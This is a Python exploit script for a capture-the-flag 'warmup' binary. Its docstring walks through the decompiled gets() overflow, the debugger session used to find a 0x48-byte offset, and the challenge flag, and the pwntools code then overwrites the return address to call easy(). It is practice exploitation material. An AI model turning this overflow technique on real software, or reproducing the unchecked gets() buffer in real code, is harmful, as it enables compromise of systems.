#!/usr/bin/python3
'''
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
When we run the binary:

-Warm Up-
WOW:0x40060d
>

After looking at Ghidra,
  ------------------------------
  char local_88 [64];
  char local_48 [64];
  
  write(1,"-Warm Up-\n",10);     :prints -Warm Up-
  write(1,&DAT_0040074c,4);      :prints WOW:
  sprintf(local_88,"%p\n",easy); :prints mem addr of easy() to local_88 buffer, the easy function is what we need to call to print the flag
  write(1,local_88,9);           :prints the mem addr: 0x40060d is the address of easy()
  write(1,&DAT_00400755,1);      :prints >
  gets(local_48);                :takes in user input, buffer only has 64 bytes <- overflow this
  return;
  ------------------------------
So from here, since there is no Stack Canary:
Just need to overflow the buffer, overwrite RBP, overwrite RIP with the address of easy(), to it returns there and call easy()
Need to find: mem addr of buffer, mem add of RBP to calculate the offset.
  ------------------------------
gef➤  search-pattern yeah
[+] Searching 'yeah' in memory
[+] In '[heap]'(0x602000-0x623000), permission=rw-
  0x6022a0 - 0x6022a6  →   "yeah\n"
[+] In '[stack]'(0x7ffffffde000-0x7ffffffff000), permission=rw-
  0x7fffffffe580 - 0x7fffffffe584  →   "yeah"        <- MEM ADDR of buffer is: 0x7fffffffe580
gef➤  p $rbp
$1 = (void *) 0x7fffffffe5c0                         <- MEM ADDR of RBP:
gef➤  p ($rbp - 0x7fffffffe580)
$2 = (void *) 0x40                                   <- OFFSET
  ------------------------------
Overwrite RBP: 0x40+0x8
then overwrite RIP with address of easy()

Flag: flag{g0ttem_b0yz}
'''
import pwn as p

def pwn():
    start = p.process('./warmup')
    payload = b'A'*0x48 + p.p64(0x40060d)
    start.sendline(payload)
    start.interactive()

if __name__ == "__main__":
    pwn()
